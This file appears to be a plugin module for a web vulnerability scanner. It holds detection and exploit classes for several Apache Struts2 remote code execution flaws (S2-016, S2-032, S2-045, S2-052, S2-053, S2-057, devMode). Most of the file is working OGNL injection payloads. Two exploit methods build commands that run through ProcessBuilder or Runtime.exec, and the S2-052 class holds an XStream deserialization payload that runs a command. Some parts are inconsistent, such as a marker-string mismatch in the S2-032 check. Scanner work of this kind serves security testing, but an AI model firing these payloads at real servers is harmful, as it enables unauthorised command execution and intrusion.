# -*- coding: utf-8 -*-

from core.plugin import BaseHttpPlugin,BaseWebPlugin

import copy

class Struts2057(BaseHttpPlugin):
    bugname = "s2-057命令执行"
    bugrank = "紧急"

    def filter(self,web,req,res):
        return req.path and req.path.lower().endswith(('.do','.action'))

    def verify(self,web,req,res):
        req = copy.deepcopy(req)
        payload = ("${99999-1234}")
        try:
            path = req.path.split('/')
            path[-2] = path[-2]+'/'+payload
            req.path = '/'.join(path)
            res1 = req.response()
            if r"8765" in res1.url and r"8765" not in res.url:
                self.bugaddr = req.url
                self.bugreq = str(req)
                self.bugres = str(res1.content)
                return True
        except Exception as e:
            print(e)


class StrutsDevMode(BaseHttpPlugin):
    bugname = "struts2-devmode命令执行"
    bugrank = "紧急"

    def filter(self,web,req,res):
        return req.path and req.path.lower().endswith(('.do','.action'))

    def verify(self,web,req,res):
        req = copy.deepcopy(req)
        data = {
            'debug':'command',
            'expression':'(%23wr%3D%23context[%23parameters.obj[0]].getWriter())!%3D(%23wr.print(%23parameters.content[0]))!%3D(%23wr.println(%23parameters.content[0]))!%3D(%23wr.flush())!%3D(%23wr.close())',
            'obj':'com.opensymphony.xwork2.dispatcher.HttpServletResponse',
            'content':'strutsdevmodetest8315'}
        try:
            req.method = 'POST'
            req.data = data
            res1 = req.response()
            if r"strutsdevmodetest8315" in res1.text and r"strutsdevmodetest8315" not in res.text:
                self.bugaddr = req.url
                self.bugreq = str(req)
                self.bugres = str(res1.content)
                return True
        except Exception as e:
            print(e)


class Struts2016(BaseHttpPlugin):
    bugname = "struts2-016命令执行"
    bugrank = "紧急"

    def filter(self,web,req,res):
        return req.path and req.path.lower().endswith(('.do','.action'))

    def verify(self,web,req,res):
        req = copy.deepcopy(req)
        payload = ("redirect%3A%24%7B"
                   "%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C"
                   "%23matt.getWriter%28%29.println%28%27STRUTStest%27%2b20%2b16%29%2C"
                   "%23matt.getWriter%28%29.flush%28%29%2C"
                   "%23matt.getWriter%28%29.close%28%29"
                   "%7D")
        try:
            req.method = 'POST'
            req.data = payload
            res1 = req.response()
            if r"STRUTStest2016" in res1.text and r"STRUTStest2016" not in res.text:
                self.bugaddr = req.url
                self.bugreq = str(req)
                self.bugres = str(res1.content)
                return True
        except Exception as e:
            print(e)


    def exploit(self,web,cmd='whoami'):
        payload = "redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'"+cmd+"'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"


class Struts2032(BaseHttpPlugin):
    bugname = "struts2-032命令执行"
    bugrank = "紧急"

    def filter(self,web,req,res):
        return req.path and req.path.lower().endswith(('.do','.action'))

    def verify(self,web,req,res):
        req = copy.deepcopy(req)
        payload = ("method:"
                    "%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C"
                    "%23k%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2C"
                    "%23k.println%28%27struts2test%27%2b20%2b32%29%2C"
                    "%23k.close")

        try:
            req.method = 'POST'
            req.data = payload
            res1 = req.response()
            if r"STRUTStest2032" in res1.text and r"STRUTStest2032" not in res.text:
                self.bugaddr = req.url
                self.bugreq = str(req)
                self.bugres = str(res1.content)
                return True
        except Exception as e:
            print(e)

    def exploit(self,web,cmd='whoami'):
        payload = """method:
                    #_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
                    #a=@java.lang.Runtime@getRuntime().exec(#parameters.command[0]).getInputStream(),
                    #b=new java.io.InputStreamReader(#a),
                    #c=new java.io.BufferedReader(#b),
                    #d=new char[51020],
                    #c.read(#d),
                    #k=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),
                    #k.println(#d),
                    #k.close
                    &command=whoami"""


class Struts2045(BaseHttpPlugin):
    bugname = "struts2-045命令执行"
    bugrank = "紧急"

    def filter(self,web,req,res):
        return req.path and req.path.lower().endswith(('.do','.action'))

    def verify(self,web,req,res):
        req = copy.deepcopy(req)
        payload = ("%{(#nike='multipart/form-data')"
                   ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
                   ".(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm))))"
                   ".(#r=@org.apache.struts2.ServletActionContext@getResponse().getWriter())"
                   ".(#r.println('STRUTStest'+20+45))"
                   ".(#r.close())}")
        try:
            req.method = 'POST'
            req.headers['Content-Type'] = payload
            res1 = req.response()
            if r"STRUTStest2045" in res1.text and r"STRUTStest2045" not in res.text:
                self.bugaddr = req.url
                self.bugreq = str(req)
                self.bugres = str(res1.content)
                return True
        except Exception as e:
            print(e)

class Struts2052(BaseHttpPlugin):
    bugname = "struts2-052命令执行"
    bugrank = "紧急"

    def filter(self,web,req,res):
        return req.path and req.path.lower().endswith(('.do','.action'))

    def verify(self,web,req,res):
        req = copy.deepcopy(req)
        payload = """<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"><dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"><is class="javax.crypto.CipherInputStream"><cipher class="javax.crypto.NullCipher"><initialized>false</initialized><opmode>0</opmode><serviceIterator class="javax.imageio.spi.FilterIterator"><iter class="javax.imageio.spi.FilterIterator"><iter class="java.util.Collections$EmptyIterator"/><next class="java.lang.ProcessBuilder"><command><string>whoami</string></command><redirectErrorStream>false</redirectErrorStream></next></iter><filter class="javax.imageio.ImageIO$ContainsFilter"><method><class>java.lang.ProcessBuilder</class><name>start</name><parameter-types/></method><name>foo</name></filter><next class="string">foo</next></serviceIterator><lock/></cipher><input class="java.lang.ProcessBuilder$NullInputStream"/><ibuffer></ibuffer><done>false</done><ostart>0</ostart><ofinish>0</ofinish><closed>false</closed></is><consumed>false</consumed></dataSource><transferFlavors/></dataHandler><dataLen>0</dataLen></value></jdk.nashorn.internal.objects.NativeString><jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/></entry><entry><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/></entry></map>"""


class Struts2053(BaseHttpPlugin):
    bugname = "struts2-053命令执行"
    bugrank = "紧急"

    def filter(self,web,req,res):
        return req.path and req.path.lower().endswith(('.do','.action'))

    def verify(self,web,req,res):
        req = copy.deepcopy(req)
        payload = "%{987654321-1234567}"
        try:
            req.url = req.path + "?redirectUri=%s"%payload
            res1 = req.response()
            if r"986419754" in res1.text and r"986419754" not in res.text:
                self.bugaddr = req.url
                self.bugreq = str(req)
                self.bugres = str(res1.content)
                return True
        except Exception as e:
            print(e)



